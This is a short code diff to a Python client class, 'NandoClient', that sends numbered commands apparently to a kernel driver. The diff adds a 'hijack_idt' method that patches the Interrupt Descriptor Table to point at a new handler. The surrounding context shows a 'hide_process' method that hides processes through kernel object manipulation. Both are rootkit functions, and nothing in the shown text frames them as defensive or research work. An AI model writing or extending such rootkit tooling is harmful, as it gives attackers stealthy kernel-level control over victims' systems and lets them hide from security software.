@@ -75,6 +75,14 @@ class NandoClient:
             
         raise Exception("[-] Command timed out")
 
+    def hijack_idt(self, idt_base, new_handler_va):
+        """
+        Uses Command 0x08 for surgical IDT hijacking.
+        """
+        print(f"[*] Patching IDT[3] at Base: 0x{idt_base:X}...")
+        status, _ = self.send_command(8, idt_base, new_handler_va)
+        return status == 0
+
     def hide_process(self, eprocess_kva):
         """
         Uses Command 0x07 for kernel-side DKOM process hiding.
